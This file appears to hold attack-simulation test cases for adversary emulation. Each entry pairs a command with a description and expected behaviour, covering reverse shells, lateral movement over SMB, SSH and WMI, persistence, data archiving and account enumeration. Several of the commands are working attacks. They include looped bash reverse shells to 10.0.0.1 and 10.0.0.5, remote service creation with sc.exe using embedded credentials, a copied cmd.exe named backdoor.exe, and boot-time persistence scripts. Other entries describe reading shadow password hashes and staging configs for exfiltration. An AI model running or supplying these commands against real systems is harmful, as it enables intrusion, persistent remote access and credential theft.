attacks.command: echo 'bash -i >& /dev/tcp/10.0.0.1/443 0>&1' | at now + 1 minute 2>/dev/null && (sleep 60; nohup bash -c 'while true; do /bin/bash -i >& /dev/tcp/10.0.0.1/443 0>&1; sleep 300; done' 2>/dev/null &)
attacks.description: Schedule a reverse shell via 'at' and establish persistent looped connection (advanced, evasive technique)
attacks.expected_behavior: Uses 'at' to delay execution and starts a background loop that reconnects every 5 minutes. Simulates persistence and timing evasion. Note: Requires 'at' daemon to be running.

attacks.description: Basic in‑memory execution: decodes a base64 string that prints 'Hello, world!' and runs it via bash without writing to disk.
attacks.expected_behavior: The command prints 'Hello, world!' to the console and exits.

attacks.description: Intermediate in‑memory execution: decodes a multi‑line bash script that prints a message, sleeps for a second, then prints a completion notice.
attacks.expected_behavior: Outputs 'Script executed in memory', waits one second, then outputs 'Finished'.

attacks.description: Advanced in‑memory execution: uses process substitution to decode a base64 payload into a file descriptor and executes it via bash, ensuring no temporary files are created on the filesystem.
attacks.expected_behavior: Prints 'Base64 decoded script executed in memory' to the console.

attacks.description: Establish an authenticated session to a remote server using valid domain credentials via SMB IPC$ share
attacks.expected_behavior: Creates an authenticated SMB session to FILESRV01 using provided credentials. The 'whoami' command verifies current context. No changes are made to the system. Connection can be viewed via 'net use' and cleaned up with 'net use \\FILESRV01\IPC$ /delete'

attacks.command: sc \\DC01 create MalSvc binPath= "cmd.exe /c echo Test > %TEMP%\svc_test.txt" obj= DOMAIN\svc_user password= PassWord123! & sc \\DC01 start MalSvc & sc \\DC01 delete MalSvc
attacks.description: Create, start, and remove a service on a remote system using valid credentials
attacks.expected_behavior: Uses 'sc.exe' to remotely install a service named 'MalSvc' on DC01 under valid domain account credentials. The service runs a benign command writing to %TEMP%. It starts once and is immediately deleted. Requires SERVICE_CREATE, SERVICE_START, and SERVICE_DELETE rights. Leaves minimal forensic traces if successful.

attacks.description: Execute a command on a remote host using PsExec and valid domain administrator credentials
attacks.expected_behavior: PsExec connects to WORKSTN01 using specified credentials, authenticates, and runs 'ipconfig /all' in a new session. This simulates lateral movement using valid admin accounts. The tool uses SMB and named pipes. Connection logs and prefetch entries may be generated. No persistent changes are made to the target.

attacks.description: Basic SSH connection to remote host using valid credentials
attacks.expected_behavior: Establishes SSH connection and executes echo command to validate credentials

attacks.description: Add SSH public key to remote host for passwordless access
attacks.expected_behavior: Creates .ssh directory and appends test public key to authorized_keys for persistence

attacks.command: ssh valid_user@remote_host "sudo useradd -m testuser && echo 'testuser:TempPass123!' | sudo chpasswd"
attacks.description: Create new user account on remote host via SSH with sudo
attacks.expected_behavior: Creates 'testuser' account with password on remote system using elevated privileges

attacks.description: Establish an authenticated SMB session to a remote host using user credentials interactively provided
attacks.expected_behavior: Creates a network connection to the administrative C$ share on REMOTE-HOST. The user will be prompted for a password. This enables file access over SMB for lateral movement.

attacks.command: sc \\REMOTE-HOST create EvilService binPath= "cmd.exe /c copy %windir%\system32\cmd.exe %APPDATA%\backdoor.exe && start %APPDATA%\backdoor.exe" start= auto && sc \\REMOTE-HOST start EvilService
attacks.description: Create and start a Windows service on a remote host using sc.exe to execute a benign copy of cmd.exe in user context
attacks.expected_behavior: Installs a new service named 'EvilService' on REMOTE-HOST that copies cmd.exe to %APPDATA% and attempts to start it. The service starts automatically. Requires elevated domain privileges.

attacks.command: powershell -Command "mkdir \REMOTE-HOST\C$\Temp -ErrorAction SilentlyContinue; $content = 'test payload'; $content | Out-File -FilePath \REMOTE-HOST\C$\Temp\test.txt -Encoding ASCII -Force; Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c echo test > %TEMP%\\wmi_test.txt' -ComputerName REMOTE-HOST"
attacks.description: Use PowerShell to write a test file over SMB and execute a command remotely via WMI
attacks.expected_behavior: Creates a directory and writes a benign test file on REMOTE-HOST via SMB, then uses WMI to execute a harmless command. Demonstrates file placement and remote execution over administrative shares and WMI, both common in lateral movement.

attacks.description: Basic remote command execution using SSH to run 'whoami' on the target host.
attacks.expected_behavior: The command connects to the remote host via SSH and prints the username under which the SSH session runs on the target.

attacks.description: Intermediate lateral movement: copies a benign script to the remote host with SCP, then executes it via SSH.
attacks.expected_behavior: The script is transferred to /tmp on the target and executed, demonstrating file transfer and remote execution via SSH.

attacks.command: ssh -o StrictHostKeyChecking=no user@192.168.1.10 "nohup bash -c 'while true; do bash -i >& /dev/tcp/10.0.0.5/4444 0>&1; sleep 30; done' >/dev/null 2>&1 &"
attacks.description: Advanced lateral movement: establishes a persistent reverse shell from the remote host back to the attacker using Bash's /dev/tcp feature, launched via SSH in the background.
attacks.expected_behavior: The remote host attempts to connect back to 10.0.0.5 on port 4444, providing an interactive shell if the attacker is listening. The loop ensures reconnection attempts, demonstrating persistence via remote services.

attacks.command: cmd.exe /c copy "%windir%\system32\cmd.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\update.bat" /Y && echo @echo test > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\update.bat"
attacks.description: Basic persistence via user startup folder using a batch script.
attacks.expected_behavior: Creates a batch file in the current user's startup directory that runs on login. The script outputs 'test' to the console. No admin rights needed. Uses built-in cmd.exe and standard paths.

attacks.description: Intermediate persistence using a scheduled task triggered at user logon with SYSTEM privileges.
attacks.expected_behavior: Creates a scheduled task named 'SystemMaintenance' that runs as SYSTEM each time a user logs on. The task executes a benign command. Requires elevated privileges. Uses built-in schtasks.exe.

attacks.command: sc.exe create "UpdateService" binPath= "%windir%\system32\cmd.exe /c echo Service started" start= auto && sc.exe start "UpdateService"
attacks.description: Advanced persistence via creation and immediate execution of a custom Windows service.
attacks.expected_behavior: Installs a new Windows service named 'UpdateService' that starts automatically and runs a benign command. The service is created and started immediately. Requires administrator privileges. Uses built-in sc.exe for service control.

attacks.description: Adds a cron job to create a file in /tmp every minute
attacks.expected_behavior: Creates /tmp/benign-cron-test file every minute via user cron

attacks.command:
echo '[Unit]
Description=Benign Test Service
[Service]
ExecStart=/bin/sh -c "echo Hello from test service >> /tmp/systemd-test.log"
[Install]
WantedBy=multi-user.target' | sudo tee /etc/systemd/system/test-persistence.service && sudo systemctl enable test-persistence.service
attacks.description: Creates and enables a systemd service that logs to /tmp
attacks.expected_behavior: Systemd service created in /etc/systemd/system and enabled for persistence

attacks.description: Appends a startup command to /etc/rc.local and makes it executable
attacks.expected_behavior: Creates /tmp/rc-local-test at boot via modified rc.local script

attacks.description: Lists all running processes briefly using WMI
attacks.expected_behavior: Displays a list of running processes with basic information

attacks.description: Creates a new process (calc.exe) on the local machine using WMI
attacks.expected_behavior: Opens a new calculator application

attacks.description: Retrieves all process objects using PowerShell's Get-WmiObject cmdlet
attacks.expected_behavior: Displays detailed information about all running processes

attacks.description: Archives all files in the Public Documents folder using PowerShell's Compress-Archive cmdlet
attacks.expected_behavior: Creates a zip archive of the files in the Public Documents folder and saves it to the TEMP directory

attacks.description: Archives all files in the Public Documents folder using the tar command
attacks.expected_behavior: Creates a tar.gz archive of the files in the Public Documents folder and saves it to the TEMP directory

attacks.description: Archives all files in the Public Documents folder using the System.IO.Compression.FileSystem assembly
attacks.expected_behavior: Creates a zip archive of the files in the Public Documents folder and saves it to the TEMP directory

attacks.description: Basic archiving of collected data using tar and gzip compression.
attacks.expected_behavior: Creates a compressed tar archive named 'archive.tgz' in the user's home directory, containing all files from the 'testdata' directory. Fails silently if 'testdata' does not exist.

attacks.description: Intermediate: Archive specific file types (logs and text files) into a zip archive using find and stdin.
attacks.expected_behavior: Finds all .log and .txt files in 'testdata' and pipes the list to zip, which creates 'collected.zip' containing those files. If no files match, zip may create an empty archive or fail silently depending on the system.

attacks.description: Advanced: Collect configuration files into a tar archive, compress with gzip, and restrict file permissions.
attacks.expected_behavior: Finds all .conf files in 'testdata', appends them to 'configs.tar', compresses it to 'configs.tar.gz', and sets restrictive permissions (owner-only read/write). Useful for bundling sensitive configuration data before exfiltration.

attacks.description: List all local user accounts on the system using legacy net.exe binary
attacks.expected_behavior: Outputs a list of local user accounts to stdout, including built-in accounts like Administrator and Guest

attacks.description: Enumerate members of the local Administrators group using net.exe
attacks.expected_behavior: Prints the list of users and groups that are members of the local Administrators group; requires elevated privileges to execute successfully

attacks.command: powershell -Command "try { Get-CimInstance -ClassName Win32_UserAccount -Filter 'LocalAccount=True' | Select-Object Name, SID, Disabled | ConvertTo-Json } catch { Write-Error 'Failed to enumerate accounts' }"
attacks.description: Use PowerShell to retrieve detailed local account information via WMI/CIM with structured output
attacks.expected_behavior: Outputs a JSON-formatted list of local user accounts with Name, SID, and Disabled status; works without admin but may skip some accounts if access is denied

attacks.description: Read the /etc/passwd file to list all user accounts and their associated metadata.
attacks.expected_behavior: Outputs the contents of /etc/passwd, showing each account's username, UID, GID, home directory, and shell.

attacks.description: Retrieve the list of usernames from the system's name service switch configuration.
attacks.expected_behavior: Prints a newline‑separated list of all usernames known to the system.

attacks.description: Access the shadow database to obtain username and password hash entries, requiring root privileges.
attacks.expected_behavior: Outputs lines of 'username:hashed_password' for each account, revealing password hash data.

attacks.description: Basic persistence: appends a command to the user's .bashrc so that a test file is created each time a new shell starts.
attacks.expected_behavior: On the next interactive bash login, $HOME/persist_test will contain the string "Persistence test".

attacks.command:
sudo bash -c 'cat <<'"'EOF'"' > /etc/init.d/persist_init
#!/bin/sh
# Simple init script for persistence test

echo "Init script executed" > /var/log/persist_init.log
exit 0
EOF
chmod +x /etc/init.d/persist_init
update-rc.d persist_init defaults'
attacks.description: Advanced persistence: installs a system‑wide init script that runs at boot and logs a message, requiring root privileges.
attacks.expected_behavior: The script /etc/init.d/persist_init is registered to start in default runlevels; on the next system boot it writes "Init script executed" to /var/log/persist_init.log.
